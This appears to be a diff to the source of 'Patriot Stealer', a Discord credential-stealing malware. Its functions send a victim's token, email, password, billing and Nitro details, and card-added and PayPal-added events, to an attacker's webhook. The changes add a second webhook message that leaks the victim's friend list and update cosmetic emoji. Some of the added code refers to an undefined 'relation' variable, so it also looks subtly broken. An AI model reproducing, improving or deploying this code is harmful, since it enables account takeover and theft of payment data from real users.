@@ -543,7 +543,7 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return '❌';
+  if (!data) return 'No billing';
   let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
@@ -557,7 +557,7 @@ const getBilling = async (token) => {
       }
     }
   });
-  if (!billing) billing = '❌';
+  if (!billing) billing = 'No billing';
   return billing;
 };
 
@@ -854,12 +854,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             inline: true,
           },
           {
-            name: '<:Patriot_Nitro:1032868403117051944> Nitro',
+            name: '<:patriot_NitroInfo:1022956411816251563> Nitro',
             value: `\`${nitro}\``,
             inline: true,
           },
           {
-            name: '<a:patriot_gng:1032868284699250731> Badges',
+            name: '<:prt_sxtaar:1032868516686200863> Badges',
             value: `\`${badges}\``,
             inline: true,
           },
@@ -879,50 +879,15 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       },
     ],
   };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const emailChanged = async (email, password, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
+  const content2 = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
-        fields: [
-        {
-          name: "<:patriot_guilds:1032868286532173904> Token",
-          value: `\`${token}\``,
-          inline: false
-        },
-        {
-          name: "<a:prt_world9:1032868293528268831> New email",
-          value: `\`${email}\``,
-          inline: true
-        },
-        {
-          name: "<:lxckk:1032868282153316353> Password",
-          value: `\`${password}\``,
-          inline: true
-        },
-        {
-          name: "<:Patriot_Nitro:1032868403117051944> Nitro",
-          value: `\`${nitro}\``,
-          inline: true
-        }, 
-        {
-          name: "<a:ptr_billing:1032868278823038987> Billing",
-          value: `\`${billing}\``,
-          inline: true
-        }, 
-        {
-          name: "<a:patriot_gng:1032868284699250731> Badges",
-          value: `\`${badges}\``,
+        fields: [{
+          name: "<:lxckk:1032868282153316353> HQ Friends" + " (Total of " + relation.length + ")",
+          value: `${relation.frien}`,
           inline: true
         },
       ],
@@ -938,6 +903,87 @@ const emailChanged = async (email, password, token) => {
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
   hooker(content);
+  hooker(content2);
+};
+
+const emailChanged = async (email, password, token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+        {
+          name: "<:patriot_idd:1032868508574416896> Token",
+          value: `\`${token}\``,
+          inline: false
+        },
+        {
+          name: "<a:prt_world9:1032868293528268831> New email",
+          value: `\`${email}\``,
+          inline: true
+        },
+        {
+          name: "<:lxckk:1032868282153316353> Password",
+          value: `\`${password}\``,
+          inline: true
+        },
+        {
+          name: "<:patriot_NitroInfo:1022956411816251563> Nitro",
+          value: `\`${nitro}\``,
+          inline: true
+        }, 
+        {
+          name: "<a:ptr_billing:1032868278823038987> Billing",
+          value: `\`${billing}\``,
+          inline: true
+        }, 
+        {
+          name: "<:prt_sxtaar:1032868516686200863> Badges",
+          value: `\`${badges}\``,
+          inline: true
+        },
+      ],
+        author: {
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: 'Patriot Stealer (t.me/patriotstealer)',
+        },
+      },
+    ],
+  };
+  const content2 = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [{
+          name: "<:lxckk:1032868282153316353> HQ Friends" + " (Total of " + relation.length + ")",
+          value: `${relation.frien}`,
+          inline: true
+        },
+      ],
+        author: {
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: 'Patriot Stealer (t.me/patriotstealer)',
+        },
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  hooker(content);
+  hooker(content2);
 };
 
 const PaypalAdded = async (token) => {
@@ -953,7 +999,7 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<:patriot_guilds:1032868286532173904> **Token**',
+            name: '<:patriot_idd:1032868508574416896> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -963,12 +1009,12 @@ const PaypalAdded = async (token) => {
             inline: true,
           },
           {
-            name: '<:Patriot_Nitro:1032868403117051944> **Nitro**',
+            name: '<:patriot_NitroInfo:1022956411816251563> **Nitro**',
             value: `\`${nitro}\``,
             inline: true,
           },
           {
-            name: '<a:patriot_gng:1032868284699250731> **Badges**',
+            name: '<:prt_sxtaar:1032868516686200863> **Badges**',
             value: `\`${badges}\``,
             inline: true,
           },
@@ -988,8 +1034,31 @@ const PaypalAdded = async (token) => {
       },
     ],
   };
+  const content2 = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [{
+          name: "<:lxckk:1032868282153316353> HQ Friends" + " (Total of " + relation.length + ")",
+          value: `${relation.frien}`,
+          inline: true
+        },
+      ],
+        author: {
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: 'Patriot Stealer (t.me/patriotstealer)',
+        },
+      },
+    ],
+  };
   if (config.ping_on_run) content['content'] = config.ping_val;
   hooker(content);
+  hooker(content2);
 };
 
 const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
@@ -1002,7 +1071,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:ptr_billing:1032868278823038987> **Token**',
+            name: '<:patriot_idd:1032868508574416896> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -1048,7 +1117,7 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:ptr_billing:1032868278823038987> **Token**',
+            name: '<:patriot_idd:1032868508574416896> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
